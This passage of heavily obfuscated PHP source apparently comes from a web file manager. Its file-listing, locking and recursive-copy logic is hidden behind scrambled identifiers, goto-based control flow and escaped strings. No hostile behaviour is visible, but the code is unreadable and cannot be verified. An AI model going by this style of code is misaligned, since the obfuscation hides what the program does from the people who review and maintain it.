$fÖªº¸·çŞ[8] . $e¸·Á–èîÅ . $fÖªº¸·çŞ[8] : $fÖªº¸·çŞ[8]; return $e¸·Á–èîÅ; } protected function _listAppendUser(&$c¹“Ú´¨¸¦) { goto d†Ô„¼”É¡; Fµ¡‰ƒ†’Ë: unset($Fì¢Õîë±¢); goto bÙ´Ó¢ºÀù; d†Ô„¼”É¡: $cÍã„ÛÀÛÜ =& $_SERVER[ä°„ä°º]; $BŒ òÄÎ¬Ù = array_to_keyvalue($c¹“Ú´¨¸¦, $cÍã„ÛÀÛÜ[33], $cÍã„ÛÀÛÜ[432]); $fğá’¥®ò = array_to_keyvalue($c¹“Ú´¨¸¦, $cÍã„ÛÀÛÜ[33], $cÍã„ÛÀÛÜ[434]); goto dÕ›ï‰Áß; dÕ›ï‰Áß: $d–ÁÍ’©÷› = array_merge($BŒ òÄÎ¬Ù, $fğá’¥®ò); $bÂƒˆ´åŒ„ = Model($cÍã„ÛÀÛÜ[519])->userListInfo($d–ÁÍ’©÷›); foreach ($c¹“Ú´¨¸¦ as &$Fì¢Õîë±¢) { $EÕ®»‘ÃæÀ = $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[432]]; $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[432]] = $bÂƒˆ´åŒ„[$EÕ®»‘ÃæÀ] ? $bÂƒˆ´åŒ„[$EÕ®»‘ÃæÀ] : !1; $EÕ®»‘ÃæÀ = $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[434]]; $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[434]] = $bÂƒˆ´åŒ„[$EÕ®»‘ÃæÀ] ? $bÂƒˆ´åŒ„[$EÕ®»‘ÃæÀ] : !1; if (isset($Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]]) && $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]][$cÍã„ÛÀÛÜ[520]]) { $C´†¢Šøˆ = $GLOBALS[$cÍã„ÛÀÛÜ[6]][$cÍã„ÛÀÛÜ[88]][$cÍã„ÛÀÛÜ[521]]; if ($Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]][$cÍã„ÛÀÛÜ[522]] <= time() - $C´†¢Šøˆ) { $this->metaSet($Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[395]], $cÍã„ÛÀÛÜ[520], null); $this->metaSet($Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[395]], $cÍã„ÛÀÛÜ[522], null); unset($Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]][$cÍã„ÛÀÛÜ[520]]); continue; } $B¶œ“²÷„ = $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]][$cÍã„ÛÀÛÜ[520]]; $Fì¢Õîë±¢[$cÍã„ÛÀÛÜ[445]][$cÍã„ÛÀÛÜ[523]] = Model($cÍã„ÛÀÛÜ[519])->getInfoSimpleOuter($B¶œ“²÷„); } } goto Fµ¡‰ƒ†’Ë; bÙ´Ó¢ºÀù: } public function parentLevelArray($D¹ÉÍá‘Ç¿) { $CÖñ»ª©Øğ =& $_SERVER[ä°„ä°º]; $D¹ÉÍá‘Ç¿ = explode($CÖñ»ª©Øğ[47], trim($D¹ÉÍá‘Ç¿, $CÖñ»ª©Øğ[47])); return array_remove_value($D¹ÉÍá‘Ç¿, $CÖñ»ª©Øğ[191]); } public function listAll($dœ¢Îª­—¦) { goto b†¹ó¥Â›¯; dîˆòƒ•²å: $fİìÂ­ì¢ = array(); foreach ($C…î¶ãÓ¥â as $A“­‘·²È => $bÆ£‡ŒÍ¶Ù) { goto c«Ø£ƒĞ„­; c«Ø£ƒĞ„­: $aâîÔ‚»ß‘ = $this->parentLevelArray($bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[502]]); array_shift($aâîÔ‚»ß‘); $bÛâï¼ ÙÆ = $a…ßê¡Æ; goto C”É»–ÒğÛ; A½Çè»ŒÇÂ: if (!$bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[403]]) { $dšôµ‚¬ª [$d´ùºö›†Ä[447]] = $bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[447]]; $dšôµ‚¬ª [$d´ùºö›†Ä[86]] = $bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[76]]; } $fİìÂ­ì¢[] = $dšôµ‚¬ª ; goto E‚×Û«–’ø; C”É»–ÒğÛ: for ($Bòƒ›Îİ÷ = 0; $Bòƒ›Îİ÷ < count($aâîÔ‚»ß‘); $Bòƒ›Îİ÷++) { $bÛâï¼ ÙÆ .= $C…î¶ãÓ¥â[$aâîÔ‚»ß‘[$Bòƒ›Îİ÷]][$d´ùºö›†Ä[28]] . $d´ùºö›†Ä[8]; } $bÛâï¼ ÙÆ .= $bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[28]]; if ($bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[403]]) { $bÛâï¼ ÙÆ .= $d´ùºö›†Ä[8]; } goto aôİ­Ó†‹; aôİ­Ó†‹: $bÛâï¼ ÙÆ = str_replace($d´ùºö›†Ä[510], $d´ùºö›†Ä[8], $bÛâï¼ ÙÆ); $bÛâï¼ ÙÆ = str_replace($d´ùºö›†Ä[510], $d´ùºö›†Ä[8], $bÛâï¼ ÙÆ); $dšôµ‚¬ª  = array($d´ùºö›†Ä[414] => str_replace($d´ùºö›†Ä[510], $d´ùºö›†Ä[8], $bÛâï¼ ÙÆ), $d´ùºö›†Ä[530] => intval($bÆ£‡ŒÍ¶Ù[$d´ùºö›†Ä[403]]), $d´ùºö›†Ä[85] => $this->pathInfoFilter($bÆ£‡ŒÍ¶Ù)); goto A½Çè»ŒÇÂ; E‚×Û«–’ø: } return $fİìÂ­ì¢; goto AÏ‡‹©™§±; bŞÄÍ™¡Å¼: $B³‚¿§†¬ = $d´ùºö›†Ä[528]; $Dâ‘š®ÛÒ = "\114\x45\x46\124\x20\x4a\117\111\116\40{$this->tablePrefix}\x69\157\x5f\x66\151\x6c\145\x20\146\151\154\x65\x20\x6f\156\x20\163\157\165\162\143\x65\x2e\146\151\154\145\111\104\40\75\x20\x66\x69\x6c\x65\x2e\146\x69\154\145\111\x44"; $C…î¶ãÓ¥â = $this->alias($d´ùºö›†Ä[529])->field($B³‚¿§†¬)->where($Cƒö¦òÒÏ×)->join($Dâ‘š®ÛÒ)->select(); goto eÄªŠê²é½; F™¥çùáš: $C…î¶ãÓ¥â = array_to_keyvalue($C…î¶ãÓ¥â, $d´ùºö›†Ä[395]); $a…ßê¡Æ = "\x2f{$Aâ•¥¢øô[$d´ùºö›†Ä[28]]}\x2f"; $a…ßê¡Æ = $a…ßê¡Æ == $d´ùºö›†Ä[510] ? $d´ùºö›†Ä[8] : $a…ßê¡Æ; goto dîˆòƒ•²å; b†¹ó¥Â›¯: $d´ùºö›†Ä =& $_SERVER[ä°„ä°º]; $Aâ•¥¢øô = $this->sourceInfo($dœ¢Îª­—¦); $Cƒö¦òÒÏ× = array($d´ùºö›†Ä[524] => array($d´ùºö›†Ä[525], $Aâ•¥¢øô[$d´ùºö›†Ä[502]] . $dœ¢Îª­—¦ . $d´ùºö›†Ä[526]), $d´ùºö›†Ä[527] => 0); goto bŞÄÍ™¡Å¼; eÄªŠê²é½: $this->_listAppendAuth($C…î¶ãÓ¥â); $this->_listAppendUser($C…î¶ãÓ¥â); $this->_listAppendPath($C…î¶ãÓ¥â); goto F™¥çùáš; AÏ‡‹©™§±: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($a„‰Û¦ÅÃ) { goto Dß©ùóÇóÇ; f®³š’„Ô…: $this->_lockEvent($a„‰Û¦ÅÃ, array($Cò”ÃøŸ Ğ[534], $Cò”ÃøŸ Ğ[535]), $b÷áë°‹Ú); $this->_lockCheckEnd($Cò”ÃøŸ Ğ[531], $a„‰Û¦ÅÃ); goto déã²ï—; bª‹Ô¨ïØ: $b÷áë°‹Ú = 1; $this->_lockEvent($a„‰Û¦ÅÃ, array($Cò”ÃøŸ Ğ[532], $Cò”ÃøŸ Ğ[533]), $b÷áë°‹Ú); $this->_lockParent($a„‰Û¦ÅÃ, array($Cò”ÃøŸ Ğ[533]), $b÷áë°‹Ú); goto f®³š’„Ô…; Dß©ùóÇóÇ: $Cò”ÃøŸ Ğ =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $this->_lockCheck($Cò”ÃøŸ Ğ[531], $a„‰Û¦ÅÃ); goto bª‹Ô¨ïØ; déã²ï—: } public function lockCopyEnd($b‚ãÏåÄŸã) { $E‡¯¦Î‡¨Ü =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $a°Ô¦Ôˆä = 0; $this->_lockEvent($b‚ãÏåÄŸã, array($E‡¯¦Î‡¨Ü[532], $E‡¯¦Î‡¨Ü[533]), $a°Ô¦Ôˆä); $this->_lockParent($b‚ãÏåÄŸã, array($E‡¯¦Î‡¨Ü[533]), $a°Ô¦Ôˆä); $this->_lockEvent($b‚ãÏåÄŸã, array($E‡¯¦Î‡¨Ü[534], $E‡¯¦Î‡¨Ü[535]), $a°Ô¦Ôˆä); } public function lockWriteStart($Eç¼ĞÛ°Ê, $DÆº£Å•¨î = '') { goto BÕ§Ñ¬ì‡†; F¢£¤´ ò¢: $aÎƒã†ğ£‚ = 1; $this->_lockKey($DšŠÛùÙô·[536] . $Eç¼ĞÛ°Ê . $DšŠÛùÙô·[95] . $DÆº£Å•¨î, $aÎƒã†ğ£‚); $this->_lockEvent($Eç¼ĞÛ°Ê, array($DšŠÛùÙô·[531], $DšŠÛùÙô·[533]), $aÎƒã†ğ£‚); goto aä°“·”ÂÓ; aä°“·”ÂÓ: $this->_lockParent($Eç¼ĞÛ°Ê, array($DšŠÛùÙô·[531], $DšŠÛùÙô·[533]), $aÎƒã†ğ£‚); $this->_lockCheckEnd($DšŠÛùÙô·[532], $Eç¼ĞÛ°Ê); goto EÜê‡¹¹¼£; BÕ§Ñ¬ì‡†: $DšŠÛùÙô· =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $this->_lockCheck($DšŠÛùÙô·[532], $Eç¼ĞÛ°Ê); goto F¢£¤´ ò¢; EÜê‡¹¹¼£: } public function lockWriteEnd($CğÚÃÏÓ‘‡, $dé“Î˜ê©× = '') { $AêŞÔÀ—ÃË =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $Aæ£«ÑáÑ = 0; $this->_lockKey($AêŞÔÀ—ÃË[536] . $CğÚÃÏÓ‘‡ . $AêŞÔÀ—ÃË[95] . $dé“Î˜ê©×, $Aæ£«ÑáÑ); $this->_lockEvent($CğÚÃÏÓ‘‡, array($AêŞÔÀ—ÃË[531], $AêŞÔÀ—ÃË[533]), $Aæ£«ÑáÑ); $this->_lockParent($CğÚÃÏÓ‘‡, array($AêŞÔÀ—ÃË[531], $AêŞÔÀ—ÃË[533]), $Aæ£«ÑáÑ); } public function lockMoveStart($bº’ãÈ¹›) { goto AõŒìº„ö°; AõŒìº„ö°: $Aå ©¨Ç‰ƒ =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aå ©¨Ç‰ƒ[533], $bº’ãÈ¹›); goto Fí„×ÃÃš÷; Fí„×ÃÃš÷: $Eµ¨ØáÃ = 1; $this->_lockKey($Aå ©¨Ç‰ƒ[537] . $bº’ãÈ¹›, $Eµ¨ØáÃ); $this->_lockEvent($bº’ãÈ¹›, array($Aå ©¨Ç‰ƒ[531], $Aå ©¨Ç‰ƒ[532]), $Eµ¨ØáÃ); goto BéîÊÅŞ°; BéîÊÅŞ°: $this->_lockParent($bº’ãÈ¹›, array($Aå ©¨Ç‰ƒ[531], $Aå ©¨Ç‰ƒ[533]), $Eµ¨ØáÃ); $this->_lockEvent($bº’ãÈ¹›, array($Aå ©¨Ç‰ƒ[538], $Aå ©¨Ç‰ƒ[534], $Aå ©¨Ç‰ƒ[535]), $Eµ¨ØáÃ); $this->_lockCheckEnd($Aå ©¨Ç‰ƒ[533], $bº’ãÈ¹›); goto b×‘ùíÜë†; b×‘ùíÜë†: } public function lockMoveEnd($B£†îÙõŞ) { goto Dõ“–ÏÕ¾„; Dõ“–ÏÕ¾„: $FÑ…†Áğï =& $_SERVER[ä°„ä°º]; if (!$this->allowLock()) { return; } $e‰ß÷•³¼Á = 0; goto fÌĞÙö¦Ê‰; fÌĞÙö¦Ê‰: $this->_lockKey($FÑ…†Áğï[537] . $B£†îÙõŞ, $e‰ß÷•³¼Á); $this->_lockEvent($B£†îÙõŞ, array($FÑ…†Áğï[531], $FÑ…†Áğï[532]), $e‰ß÷•³¼Á); $this->_lockParent($B£†îÙõŞ, array($FÑ…†Áğï[531], $FÑ…†Áğï[533]), $e‰ß÷•³¼Á); goto CÔ¸®¨³; CÔ¸®¨³: $this->_lockEvent($B£†îÙõŞ, array($FÑ…†Áğï[538], $FÑ…†Áğï[534], $FÑ…†Áğï[535]), $e‰ß÷•³¼Á); goto Dí¿¥·½ô‚; Dí¿¥·½ô‚: } private function _lockCheck($BÉ½Ç‹¦È, $B‘§‚Ñµœ¥) { goto fÂ®¿‡â©‚; fÂ®¿‡â©‚: $få¼±ğ‰äƒ =& $_SERVER[ä°„ä°º]; $AœÌ©ƒª¹‰ = $this->sourceInfo($B‘§‚Ñµœ¥); $D²Šæ‰…• = $BÉ½Ç‹¦È . $få¼±ğ‰äƒ[95] . $B‘§‚Ñµœ¥; goto DÑÂà›¦Ã«; DÑÂà›¦Ã«: $this->_lockTimeStart[$D²Šæ‰…•] = timeFloat(); if (!is_array($AœÌ©ƒª¹‰)) { return; } $B°ïˆÛïñ« = LNG($få¼±ğ‰äƒ[539]); goto cíî¬¶¸“Ò; cÛÄâ¹Êê½: $dÃŞÀáº†Í = array_reverse($this->parentLevelArray($AœÌ©ƒª¹‰[$få¼±ğ‰äƒ[502]])); foreach ($dÃŞÀáº†Í as $eïÎË¶Ÿ’») { $D²Šæ‰…• = $BÉ½Ç‹¦È . $få¼±ğ‰äƒ[540] . $eïÎË¶Ÿ’»; if (CacheLock::lockGet($få¼±ğ‰äƒ[541] . $D²Šæ‰…•)) { $AœÌ©ƒª¹‰ = $this->sourceInfo($eïÎË¶Ÿ’»); CacheLock::setErrorMsg($få¼±ğ‰äƒ[160] . htmlspecialchars($AœÌ©ƒª¹‰[$få¼±ğ‰äƒ[28]]) . $få¼±ğ‰äƒ[517] . $B°ïˆÛïñ«); $this->_lockKey($D²Šæ‰…•, 1); $this->_lockKey($D²Šæ‰…•, 0); } } goto a™ÙóŒÈÕ; cíî¬¶¸“Ò: CacheLock::setErrorMsg($få¼±ğ‰äƒ[160] . htmlspecialchars($AœÌ©ƒª¹‰[$få¼±ğ‰äƒ[28]]) . $få¼±ğ‰äƒ[517] . $B°ïˆÛïñ«); $this->_lockKey($D²Šæ‰…•, 1); $this->_lockKey($D²Šæ‰…•, 0); goto cÛÄâ¹Êê½; a™ÙóŒÈÕ: } private function _lockCheckEnd($d–Áù÷¿ÚÌ, $DÉ‚¼ï¼¡¥) { goto aƒó»¶¢Ö†; a‚±‘™Ï¿: if ($BÌÍ¿Î’’Ò > 0.5) { unset(self::$cacheSourceInfo[$AÇºÙêÜ´Å[438] . $DÉ‚¼ï¼¡¥]); } $F’ñ†öìôÕ = $this->sourceInfo($DÉ‚¼ï¼¡¥); if (!$F’ñ†öìôÕ) { show_json(LNG($AÇºÙêÜ´Å[105]), !1); } goto aŸœÅ¸›òÆ; E‚á¥å¯ ä: if (!isset($this->_lockTimeStart[$E¶ ×ÖÂ¯•])) { return; } $BÌÍ¿Î’’Ò = timeFloat() - $this->_lockTimeStart[$E¶ ×ÖÂ¯•]; unset($this->_lockTimeStart[$E¶ ×ÖÂ¯•]); goto a‚±‘™Ï¿; aƒó»¶¢Ö†: $AÇºÙêÜ´Å =& $_SERVER[ä°„ä°º]; $E¶ ×ÖÂ¯• = $d–Áù÷¿ÚÌ . $AÇºÙêÜ´Å[95] . $DÉ‚¼ï¼¡¥; CacheLock::setErrorMsg($AÇºÙêÜ´Å[375]); goto E‚á¥å¯ ä; aŸœÅ¸›òÆ: } private function _lockParent($F„À®ù…Ä, $C…è†å¶¢, $A­Ïˆ´Å) { if (!$this->autoLockSet) { return; } $eô¸ïÍÔ¼å = $this->sourceInfo($F„À®ù…Ä); if (!is_array($eô¸ïÍÔ¼å)) { return; } $FÄò‹‚ÜÂ• = array_reverse($this->parentLevelArray($eô¸ïÍÔ¼å[$_SERVER[ä°„ä°º][502]])); foreach ($FÄò‹‚ÜÂ• as $e·ˆ×âÉ²) { $this->_lockEvent($e·ˆ×âÉ², $C…è†å¶¢, $A­Ïˆ´Å); } } private function _lockEvent($Cˆù°Éƒ, $c¡ƒØÅ»Ï¥, $a£ê‹®Ç¹÷) { $dÑÌ°“®ÇÇ =& $_SERVER[ä°„ä°º]; if (!$this->autoLockSet) { return; } foreach ($c¡ƒØÅ»Ï¥ as $dĞŞ„ÚÌÚì) { $eäÏäœŒÆ¨ = $dĞŞ„ÚÌÚì . $dÑÌ°“®ÇÇ[95] . $Cˆù°Éƒ; if ($a£ê‹®Ç¹÷ && CacheLock::lockGet($dÑÌ°“®ÇÇ[541] . $eäÏäœŒÆ¨)) { continue; } $this->_lockKey($eäÏäœŒÆ¨, $a£ê‹®Ç¹÷); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aƒğß‰›íí, $fášÛÂîğ… = 1) { $e²ãÊ¦÷»® = $_SERVER[ä°„ä°º][541] . md5($aƒğß‰›íí); if ($fášÛÂîğ…) { if (isset(self::$_lockItemArr[$e²ãÊ¦÷»®])) { return; } self::$_lockItemArr[$e²ãÊ¦÷»®] = 1; CacheLock::lock($e²ãÊ¦÷»®, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$e²ãÊ¦÷»®])) { return; } unset(self::$_lockItemArr[$e²ãÊ¦÷»®]); CacheLock::unlock($e²ãÊ¦÷»®); } } public function isParentOf($DîêÍÉÒ, $Dº–‚àÁ‚) { goto c¯ƒÔ‘¾Ù; fò™‹­§­: $DóÕáƒèÚİ = $CÀÚƒš å§[$FáİÀ„µ‡¦[502]] . $CÀÚƒš å§[$FáİÀ„µ‡¦[395]] . $FáİÀ„µ‡¦[47]; $B…½ê½¸ = $dŒİ¦ª§™¡[$FáİÀ„µ‡¦[502]] . $dŒİ¦ª§™¡[$FáİÀ„µ‡¦[395]] . $FáİÀ„µ‡¦[47]; $F¹½ÏÑìÖÚ = strpos($B…½ê½¸, $DóÕáƒèÚİ) === 0; goto aİ¹ó…¢ŠÈ; aİ¹ó…¢ŠÈ: return $F¹½ÏÑìÖÚ; goto bÚİºîç; c¯ƒÔ‘¾Ù: $FáİÀ„µ‡¦ =& $_SERVER[ä°„ä°º]; $CÀÚƒš å§ = $this->sourceInfo($DîêÍÉÒ); $dŒİ¦ª§™¡ = $this->sourceInfo($Dº–‚àÁ‚); goto fò™‹­§­; bÚİºîç: } private $targetIsDelete = 0; public function copy($Bïù®Ô–¹, $Cö«ä’Æ‹á, $d²†îùßšø = REPEAT_REPLACE, $c¼ƒ†é¯²À = '') { goto EÑ†Åå‡Ù‚; aè÷îº×: $this->saveAll($aÑËÏ”ˆÏÍ[$FÑĞ“ƒÈ¨ˆ[544]]); Model($FÑĞ“ƒÈ¨ˆ[193])->linkAdd($aÑËÏ”ˆÏÍ[$FÑĞ“ƒÈ¨ˆ[542]]); $this->folderSizeReset($Cö«ä’Æ‹á); goto cºò“Êµ¯; fÄŸº÷¬§È: if ($CÆÑ»‚¨ëù[$FÑĞ“ƒÈ¨ˆ[403]] == $FÑĞ“ƒÈ¨ˆ[87] && $CÊ¶­ïŒÚõ == $aôòÎƒ·İ) { $this->folderSizeResetChildren($CÊ¶­ïŒÚõ); } Model($FÑĞ“ƒÈ¨ˆ[545])->addAll($aÑËÏ”ˆÏÍ[$FÑĞ“ƒÈ¨ˆ[543]], array(), !0); if ($CÊ¶­ïŒÚõ != $aôòÎƒ·İ || $CÆÑ»‚¨ëù[$FÑĞ“ƒÈ¨ˆ[403]] == $FÑĞ“ƒÈ¨ˆ[87]) { Model($FÑĞ“ƒÈ¨ˆ[546])->eventCopy($aôòÎƒ·İ); } goto aè÷îº×; EÑ†Åå‡Ù‚: $FÑĞ“ƒÈ¨ˆ =& $_SERVER[ä°„ä°º]; $CÆÑ»‚¨ëù = $this->sourceInfo($Bïù®Ô–¹); $d¸µ·Òôª = $this->sourceInfo($Cö«ä’Æ‹á); goto dÓ™Õ‚Ä­; d¤Ìè¥îÅÎ: $this->_childrenListClear(); $this->lockCopyEnd($Bïù®Ô–¹); $this->lockWriteEnd($Cö«ä’Æ‹á, $eÍ‘¥Ä¹Ş ); goto fÄŸº÷¬§È; aíáŠâË°£: $this->targetIsDelete = intval($CÆÑ»‚¨ëù[$FÑĞ“ƒÈ¨ˆ[423]]); $CÊ¶­ïŒÚõ = $this->fileNameExistCache($Cö«ä’Æ‹á, $CÆÑ»‚¨ëù[$FÑĞ“ƒÈ¨ˆ[28]]); $aôòÎƒ·İ = $this->_copy($Bïù®Ô–¹, $Cö«ä’Æ‹á, $d²†îùßšø, $aÑËÏ”ˆÏÍ, !0, $c¼ƒ†é¯²À); goto d¤Ìè¥îÅÎ; dÓ™Õ‚Ä­: if (!$CÆÑ»‚¨ëù || !$d¸µ·Òôª || $d¸µ·Òôª[$FÑĞ“ƒÈ¨ˆ[403]] != $FÑĞ“ƒÈ¨ˆ[87]) { return !1; } if ($this->isParentOf($Bïù®Ô–¹, $Cö«ä’Æ‹á)) { return !1; } $eÍ‘¥Ä¹Ş  = $c¼ƒ†é¯²À ? $c¼ƒ†é¯²À : $CÆÑ»‚¨ëù[$FÑĞ“ƒÈ¨ˆ[28]]; goto Dõ·˜’›£; cºò“Êµ¯: $this->updateModifyTime($Cö«ä’Æ‹á); return $aôòÎƒ·İ; goto EÅÀŞªä‰â; Dõ·˜’›£: $this->lockCopyStart($Bïù®Ô–¹); $this->lockWriteStart($Cö«ä’Æ‹á, $eÍ‘¥Ä¹Ş ); $aÑËÏ”ˆÏÍ = array($FÑĞ“ƒÈ¨ˆ[542] => array(), $FÑĞ“ƒÈ¨ˆ[543] => array(), $FÑĞ“ƒÈ¨ˆ[544] => array()); goto aíáŠâË°£; EÅÀŞªä‰â: } private function _copy($Bê¹Îø‚¥Ï, $D—¢¹Ğ×·«, $F éØ‘‡ˆ, &$EÉßºƒ­Ê£, $d®ÙğùƒÓê, $b¾©…¬“¹Ş = '') { goto d²ƒá¥ª´Î; d²ƒá¥ª´Î: $Cî’ŒÃÇÜÌ =& $_SERVER[ä°„ä°º]; $B‰äãÅ–àª = $this->sourceInfoCache($Bê¹Îø‚¥Ï); $Dáğ¨Â¾†Ğ = $B‰äãÅ–àª[$Cî’ŒÃÇÜÌ[403]] == $Cî’ŒÃÇÜÌ[87]; goto Dõö ”–õĞ; Dõö ”–õĞ: $eÓ†·¸Àï = $b¾©…¬“¹Ş ? $b¾©…¬“¹Ş : $B‰äãÅ–àª[$Cî’ŒÃÇÜÌ[28]]; $D‘·¯ãˆŸ = $this->fileNameExistCache($D—¢¹Ğ×·«, $eÓ†·¸Àï); if ($d®ÙğùƒÓê) { $this->_childrenAllMake($Bê¹Îø‚¥Ï); if ($Dáğ¨Â¾†Ğ && $D‘·¯ãˆŸ) { $this->_childrenAllMake($D‘·¯ãˆŸ); } } goto E¹£ÌËæ; b­ª†Øé»»: return $c‰ã¦Ü‘İ; goto f´ñ£Ğå¶§; E¹£ÌËæ: if (!$D‘·¯ãˆŸ) { return $this->_copyCreate($Bê¹Îø‚¥Ï, $D—¢¹Ğ×·«, $eÓ†·¸Àï, $EÉßºƒ­Ê£); } $c‰ã¦Ü‘İ = $D‘·¯ãˆŸ; if ($Dáğ¨Â¾†Ğ) { if ($F éØ‘‡ˆ == REPEAT_RENAME_FOLDER) { $eÓ†·¸Àï = $this->fileNameAutoCache($D—¢¹Ğ×·«, $eÓ†·¸Àï, $F éØ‘‡ˆ, $Dáğ¨Â¾†Ğ); $c‰ã¦Ü‘İ = $this->_copyCreate($Bê¹Îø‚¥Ï, $D—¢¹Ğ×·«, $eÓ†·¸Àï, $EÉßºƒ­Ê£); } else { $cñåæ©õĞÁ = $this->_childrenList($Bê¹Îø‚¥Ï); foreach ($cñåæ©õĞÁ as $F¶‘‚­ø‘) { $this->_copy($F¶‘‚­ø‘[$Cî’ŒÃÇÜÌ[395]], $D‘·¯ãˆŸ, $F éØ‘‡ˆ, $EÉßºƒ­Ê£, !1); } } } else { if ($F éØ‘‡ˆ == REPEAT_RENAME || $F éØ‘‡ˆ == REPEAT_RENAME_FOLDER) { $eÓ†·¸Àï = $this->fileNameAutoCache($D—¢¹Ğ×·«, $eÓ†·¸Àï, $F éØ‘‡ˆ, $Dáğ¨Â¾†Ğ); $c‰ã¦Ü‘İ = $this->_copyCreate($Bê¹Îø‚¥Ï, $D—¢¹Ğ×·«, $eÓ†·¸Àï, $EÉßºƒ­Ê£); } else { if ($F éØ‘‡ˆ == REPEAT_REPLACE) { $aÙªà±Ú— = $this->sourceInfoCache($D‘·¯ãˆŸ); $BÉ£»Ç±Ö = $this->fileHistory($aÙªà±Ú—, $B‰äãÅ–àª[$Cî’ŒÃÇÜÌ[447]], $B‰äãÅ–àª[$Cî’ŒÃÇÜÌ[78]]); if ($BÉ£»Ç±Ö) { $EÉßºƒ­Ê£[$Cî’ŒÃÇÜÌ[542]][] = $B‰äãÅ–àª[$Cî’ŒÃÇÜÌ[447]]; } } else { if ($F éØ‘‡ˆ == REPEAT_SKIP) { } } } Hook::trigger($Cî’ŒÃÇÜÌ[547], array($Cî’ŒÃÇÜÌ[548], $B‰äãÅ–àª, 0)); } goto b­ª†Øé»»; f´ñ£Ğå¶§: } private function _copyCreate($c—‰­¤„¨, $c¿„éç¹«, $EÙŸ¿æøÎ§, &$fÔ¾Î²ºòÀ) { goto A‹µÙ‹¶õÙ; Fª¢é¦ãÔ: $fô ñÔ£‹ = $this->_makeItemData($cóï®ØàÈ•, $EÇ‡êÏåÎ, $EÙŸ¿æøÎ§); Hook::trigger($fÔïòâÅ¹…[549], $fô ñÔ£‹); Hook::trigger($fÔïòâÅ¹…[550], array($fÔïòâÅ¹…[551], $fô ñÔ£‹, 0)); goto F±ºÈî Ş„; f‰Ø‚ãâ²ï: $c†¤Ûåòğ¥ = $this->sourceInfo($c½İèµÖÀ); foreach ($B—Ì‡Ô»„ğ as $eè°¤¶çï) { $a‚§Ï¹­Ô‹ = $this->_makeItemData($eè°¤¶çï, $c†¤Ûåòğ¥, $eè°¤¶çï[$fÔïòâÅ¹…[28]]); $a‚§Ï¹­Ô‹[$fÔïòâÅ¹…[502]] = $eè°¤¶çï[$fÔïòâÅ¹…[502]]; $D·§´ªØÌñ[] = $a‚§Ï¹­Ô‹; } $this->chunkEventSet($fÔïòâÅ¹…[552], array($fÔïòâÅ¹…[553], $fô ñÔ£‹, $A›«ëÒ³ÁÃ)); goto BÚŒâ ÕƒÓ; EÂ—Âì™†¹: $d„ÉÚÚË[$c—‰­¤„¨] = $c½İèµÖÀ; $Dã‹ƒÆ‰¦£ = array(); $A‡©î»†ÃÖ = array(); goto a“ÌõŠ»Îê; B¡÷µ½Œ¼ó: $this->chunkEventSet($fÔïòâÅ¹…[556], array($fÔïòâÅ¹…[557], $fô ñÔ£‹, $A›«ëÒ³ÁÃ)); $this->saveAll($A‡©î»†ÃÖ); return $c½İèµÖÀ; goto fƒ—Ø‹¬åê; A‹µÙ‹¶õÙ: $fÔïòâÅ¹… =& $_SERVER[ä°„ä°º]; $cóï®ØàÈ• = $this->sourceInfoCache($c—‰­¤„¨); $EÇ‡êÏåÎ = $this->sourceInfoCache($c¿„éç¹«); goto Fª¢é¦ãÔ; fÇ†«òïÍ: if ($cóï®ØàÈ•[$fÔïòâÅ¹…[403]] != $fÔïòâÅ¹…[87]) { $fÔ¾Î²ºòÀ[$fÔïòâÅ¹…[542]][] = $cóï®ØàÈ•[$fÔïòâÅ¹…[447]]; return $c½İèµÖÀ; } $B—Ì‡Ô»„ğ = array(); $D·§´ªØÌñ = array(); goto Aİ¬››®¹; a“ÌõŠ»Îê: foreach ($Dù„Å½…ƒ as $eè°¤¶çï) { $DáŠÄæ†× = $eè°¤¶çï[$fÔïòâÅ¹…[395]]; $bÂ¸É¹¯éË = $this->_childrenMatch($d„ÉÚÚË, $eè°¤¶çï, $c†¤Ûåòğ¥); $Dã‹ƒÆ‰¦£[] = array($fÔïòâÅ¹…[395], $DáŠÄæ†×, $fÔïòâÅ¹…[478], $bÂ¸É¹¯éË[$fÔïòâÅ¹…[478]]); $A‡©î»†ÃÖ[] = array($fÔïòâÅ¹…[395], $DáŠÄæ†×, $fÔïòâÅ¹…[502], $bÂ¸É¹¯éË[$fÔïòâÅ¹…[502]]); $this->_copyApplyMeta($eè°¤¶çï, $fÔ¾Î²ºòÀ); if ($eè°¤¶çï[$fÔïòâÅ¹…[403]] != $fÔïòâÅ¹…[87]) { $fÔ¾Î²ºòÀ[$fÔïòâÅ¹…[542]][] = $eè°¤¶çï[$fÔïòâÅ¹…[447]]; } } $this->chunkEventSet($fÔïòâÅ¹…[554], array($fÔïòâÅ¹…[555], $fô ñÔ£‹, $A›«ëÒ³ÁÃ)); $this->saveAll($Dã‹ƒÆ‰¦£); goto B¡÷µ½Œ¼ó; Aİ¬››®¹: $this->_childrenListAll($c—‰­¤„¨, $B—Ì‡Ô»„ğ); $A›«ëÒ³ÁÃ = count($B—Ì‡Ô»„ğ); if ($A›«ëÒ³ÁÃ == 0) { 